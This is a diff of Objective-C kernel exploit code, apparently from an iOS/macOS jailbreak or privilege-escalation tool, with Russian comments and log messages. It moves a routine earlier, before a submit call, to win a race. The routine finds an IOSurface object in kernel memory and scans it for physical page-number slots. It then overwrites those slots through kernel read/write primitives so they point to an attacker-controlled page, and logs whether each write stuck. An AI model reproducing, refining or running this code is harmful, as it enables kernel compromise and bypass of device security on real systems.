@@ -6060,9 +6060,83 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
         if (surfVA) {
-            kpNote(r, [NSString stringWithFormat:@"  ★ порт-маршрут дал surfVA=%#llx — слоты/подмена после op-entry oracle", (unsigned long long)surfVA]);
+            kpNote(r, [NSString stringWithFormat:@"  ★ порт-маршрут дал surfVA=%#llx — слоты/подмена ДО submit", (unsigned long long)surfVA]);
         } else {
             kpNote(r, @"  порт-маршрут: IOSurface не найден ни по одному порту задачи — уходим в старые пути");
+        }
+        // 1.9.155: подмена ДО submit — прогон 1.9.154 показал, что victim успевает
+        // исполниться до подмены (churn с нулевым TSD не держит workloop). Порт-
+        // маршрут даёт surfVA задолго до scaler-коннекшенов — гонки нет вообще.
+        if (surfVA && !nSlots) {
+            uint64_t objs[6] = { surfVA, 0, 0, 0, 0, 0 };
+            uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
+            if (kpLooksLikeKernelPointer(ro)) {
+                objs[1] = ro;
+                uint64_t q18 = early_kread64(ro + 0x18);
+                uint64_t arrP = kp_untag_ptr(q18);
+                if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) objs[3] = arrP;
+            }
+            uint64_t plane = kp_untag_ptr(early_kread64(surfVA + 0x30));
+            if (kpLooksLikeKernelPointer(plane)) {
+                objs[4] = plane;
+                uint64_t plane2 = kp_untag_ptr(early_kread64(plane + 0x188));
+                if (kpLooksLikeKernelPointer(plane2)) objs[5] = plane2;
+            }
+            uint64_t rcnt = early_kread64(surfVA + 0x3a4);
+            uint64_t xr = early_kread64(surfVA + 0x360);
+            uint64_t xru = kp_untag_ptr(xr);
+            if (rcnt >= 1 && rcnt <= 4 && kpLooksLikeKernelPointer(xru)) objs[2] = xru;
+            kpNote(r, [NSString stringWithFormat:@"  IOSurface %#llx: rangeObj(+0x178)=%#llx plane(+0x30)=%#llx ranges(+0x360)=%#llx rangeCount(+0x3a4)=%llu",
+                      (unsigned long long)surfVA, (unsigned long long)ro,
+                      (unsigned long long)plane, (unsigned long long)xr, (unsigned long long)rcnt]);
+            const uint32_t lims[6] = { 0x400, 0x100, 0x100, 0x100, 0x200, 0x100 };
+            for (int k = 0; k < 6 && nSlots < 8; k++) {
+                uint64_t ob = objs[k];
+                if (!ob) continue;
+                uint32_t lim = lims[k];
+                uint32_t room = 0x4000 - (uint32_t)(ob & 0x3fff);
+                if (room < lim) lim = room;
+                for (uint32_t o = 0; o + 8 <= lim && nSlots < 8; o += 8) {
+                    uint64_t q = early_kread64(ob + o);
+                    int form = 0;
+                    if ((uint32_t)(q >> 32) == pfn32) form = 1;       // {pfn32, pagecount}
+                    else if (q == backingPA) form = 2;                // IOAddressRange.addr
+                    else if (q == (backingPA >> 14)) form = 3;        // pfn64
+                    else if ((uint32_t)q == pfn32) form = 4;          // pfn в low32
+                    if (!form) continue;
+                    BOOL dup = NO;
+                    for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
+                    if (dup) continue;
+                    slotVAs[nSlots] = ob + o;
+                    origQs[nSlots] = q;
+                    slotForm[nSlots] = form;
+                    kpNote(r, [NSString stringWithFormat:@"  pfn-слот#%d форма%d @ %#llx: %#018llx",
+                              nSlots, form, (unsigned long long)(ob + o), (unsigned long long)q]);
+                    nSlots++;
+                }
+            }
+            if (nSlots) {
+                rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
+                int stuck = 0;
+                for (int j = 0; j < nSlots; j++) {
+                    uint64_t newQ = (slotForm[j] == 1)
+                                  ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
+                                  : (slotForm[j] == 2) ? ctlPA
+                                  : (slotForm[j] == 3) ? (ctlPA >> 14)
+                                  : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
+                    early_kwrite64(slotVAs[j], newQ);
+                    uint64_t rb = early_kread64(slotVAs[j]);
+                    if (rb == newQ) stuck++;
+                    kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА слот#%d %#018llx → %#018llx — %@",
+                              j, (unsigned long long)origQs[j], (unsigned long long)newQ,
+                              rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
+                }
+                kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, пропатчено %d/%d слотов ДО submit",
+                          (unsigned long long)surfVA, stuck, nSlots]);
+                if (!stuck) nSlots = 0;   // запись не липнет — откат к старым путям
+            } else {
+                kpNote(r, @"  IOSurface найден, но pfn-слотов нет — уходим в старые пути");
+            }
         }
     }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
@@ -6214,89 +6288,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, @"  op-entry oracle: записи с credit=0x10 нет или указателей с pfn — дренулись/scheduler не тот");
         }
     }
-    // Сбор pfn-слотов + подмена — для surfVA из ЛЮБОГО маршрута (порт/op-entry
-    // oracle). Все копии page-list'а: сам объект (0x400), rangeObj(+0x178),
-    // XPF ranges(+0x360 если ptr, gate по rangeCount +0x3a4). Окно churn-backlog.
-    if (surfVA && !nSlots) {
-        // 1.9.154: полная цепочка execute (раунд 29): [surf+0x30] plane-descriptor
-        // → [plane+0x188] → … → pfn-массив. Прогон 1.9.153: rangeObj = мелкий
-        // дескриптор (counts+размер), PA-списка в нём нет. Скан по 6 объектам.
-        uint64_t objs[6] = { surfVA, 0, 0, 0, 0, 0 };
-        uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
-        if (kpLooksLikeKernelPointer(ro)) {
-            objs[1] = ro;
-            uint64_t q18 = early_kread64(ro + 0x18);
-            uint64_t arrP = kp_untag_ptr(q18);
-            kpNote(r, [NSString stringWithFormat:@"  rangeObj %#llx: [+0x18]=%#018llx%@",
-                      (unsigned long long)ro, (unsigned long long)q18,
-                      kpLooksLikeKernelPointer(arrP) ? @" (ptr → массив)" : @" (значение)"]);
-            if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) objs[3] = arrP;
-        }
-        uint64_t plane = kp_untag_ptr(early_kread64(surfVA + 0x30));
-        uint64_t plane2 = 0;
-        if (kpLooksLikeKernelPointer(plane)) {
-            objs[4] = plane;
-            plane2 = kp_untag_ptr(early_kread64(plane + 0x188));
-            if (kpLooksLikeKernelPointer(plane2)) objs[5] = plane2;
-        }
-        kpNote(r, [NSString stringWithFormat:@"  цепочка: [surf+0x30]=%#llx [plane+0x188]=%#llx",
-                  (unsigned long long)plane, (unsigned long long)plane2]);
-        uint64_t rcnt = early_kread64(surfVA + 0x3a4);
-        uint64_t xr = early_kread64(surfVA + 0x360);
-        uint64_t xru = kp_untag_ptr(xr);
-        if (rcnt >= 1 && rcnt <= 4 && kpLooksLikeKernelPointer(xru)) objs[2] = xru;
-        kpNote(r, [NSString stringWithFormat:@"  IOSurface %#llx: rangeObj(+0x178)=%#llx ranges(+0x360)=%#llx rangeCount(+0x3a4)=%llu",
-                  (unsigned long long)surfVA, (unsigned long long)ro,
-                  (unsigned long long)xr, (unsigned long long)rcnt]);
-        const uint32_t lims[6] = { 0x400, 0x100, 0x100, 0x100, 0x200, 0x100 };
-        for (int k = 0; k < 6 && nSlots < 8; k++) {
-            uint64_t ob = objs[k];
-            if (!ob) continue;
-            uint32_t lim = lims[k];
-            uint32_t room = 0x4000 - (uint32_t)(ob & 0x3fff);
-            if (room < lim) lim = room;
-            for (uint32_t o = 0; o + 8 <= lim && nSlots < 8; o += 8) {
-                uint64_t q = early_kread64(ob + o);
-                int form = 0;
-                if ((uint32_t)(q >> 32) == pfn32) form = 1;       // {pfn32, pagecount}
-                else if (q == backingPA) form = 2;                // IOAddressRange.addr
-                else if (q == (backingPA >> 14)) form = 3;        // pfn64
-                else if ((uint32_t)q == pfn32) form = 4;          // pfn в low32
-                if (!form) continue;
-                BOOL dup = NO;
-                for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
-                if (dup) continue;
-                slotVAs[nSlots] = ob + o;
-                origQs[nSlots] = q;
-                slotForm[nSlots] = form;
-                kpNote(r, [NSString stringWithFormat:@"  pfn-слот#%d форма%d @ %#llx: %#018llx",
-                          nSlots, form, (unsigned long long)(ob + o), (unsigned long long)q]);
-                nSlots++;
-            }
-        }
-        if (nSlots) {
-            rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
-            int stuck = 0;
-            for (int j = 0; j < nSlots; j++) {
-                uint64_t newQ = (slotForm[j] == 1)
-                              ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
-                              : (slotForm[j] == 2) ? ctlPA
-                              : (slotForm[j] == 3) ? (ctlPA >> 14)
-                              : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
-                early_kwrite64(slotVAs[j], newQ);
-                uint64_t rb = early_kread64(slotVAs[j]);
-                if (rb == newQ) stuck++;
-                kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА слот#%d %#018llx → %#018llx — %@",
-                          j, (unsigned long long)origQs[j], (unsigned long long)newQ,
-                          rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
-            }
-            kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, пропатчено %d/%d слотов (окно churn-backlog)",
-                      (unsigned long long)surfVA, stuck, nSlots]);
-            if (!stuck) nSlots = 0;   // запись не липнет — откат к старым путям
-        } else {
-            kpNote(r, @"  IOSurface найден, но pfn-слотов нет — уходим в старые пути");
-        }
-    }
+    // (блок слотов/подмены перенесён в порт-маршрут — теперь строго ДО submit, 1.9.155)
     // 3. Резолв surfVA через реестр фреймворковского UC (раунд 21):
     //    [ucVA+0xe8] = collection → +0xd0 array (индекс=surfaceID) → surfVA,
     //    верификация [surfVA+0x10]==dstID. UC находим перебором наших портов —
